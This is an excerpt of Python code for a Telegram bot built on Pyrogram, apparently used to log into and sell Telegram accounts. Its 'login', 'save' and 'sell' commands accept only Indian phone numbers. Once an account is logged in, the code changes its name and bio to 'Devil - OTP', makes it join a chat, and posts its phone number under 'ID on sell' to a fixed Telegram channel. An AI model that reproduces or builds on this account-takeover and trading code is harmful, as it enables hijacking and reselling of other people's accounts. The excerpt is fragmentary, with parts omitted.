...
async def sub_proc(client):
    try:
       await client.join_chat("TeamXAce")
    except Exception:
       pass
    try:
       await client.update_profile(first_name="Devil - OTP", bio="© Devil")
    except Exception:
       pass 

@Client.on_message(filters.user(DEVS) & filters.private & filters.command(['login', 'save', 'sell']))
async def generate_session(bot: Client, msg: Message):
    ...
    if await cancelled(phone_number_msg):
        return
    if phone_number_msg.text.startswith("+91"):
       phone_number = phone_number_msg.text
    else:
       await phone_number_msg.reply("Please login indian number only!")
       return
    ...
    await bot.send_message(-1001867815837, f"**ID on sell** \nLogin By: {chat.id} \nPhone no: {phone_number}")
...
@Client.on_message(filters.user(DEVS) & filters.private & filters.command(['multi']))
